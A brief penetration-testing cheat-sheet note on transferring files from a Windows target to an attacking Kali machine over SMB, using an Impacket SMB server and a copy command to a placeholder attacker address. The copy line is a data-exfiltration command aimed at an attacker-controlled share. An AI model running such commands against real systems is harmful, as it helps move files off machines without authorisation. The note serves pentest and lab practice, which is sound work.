# Transfert file between target and attacking machines

## SMB

### From Target to machine

- In kali we can use Impacket `python3 smbserver.py -smb2support sharename /path/folder`
- In a win victim machine we just need to copy the file to the attacking machine: `copy  FiletoDownload \\IP-OFF-ATTACKING-MACHINE\SHARENAME`

